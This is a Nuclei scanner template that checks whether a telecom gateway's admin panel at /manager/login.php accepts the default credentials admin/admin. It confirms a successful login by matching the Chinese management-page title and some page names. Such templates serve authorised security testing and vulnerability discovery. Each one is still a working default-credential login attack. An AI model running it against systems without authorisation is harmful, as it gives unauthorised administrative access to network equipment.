id: telecom-gateway-default-login

info:
  name: Telecom Gateway - Admin Login Discovery
  author: ritikchaddha
  severity: high
  description: Telecom Gateway default admin login credentials were successful.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id:
    cwe-id: CWE-522
  tags: telecom,default-login,gateway

requests:
  - raw:
      - |
        POST /manager/login.php HTTP/1.1
        Host: {{Hostname}}

        Name={{username}}&Pass={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<title>电信网关服务器管理后台</title>"
          - "index-shang.php"
          - "di.php"
        condition: and

      - type: status
        status:
          - 200

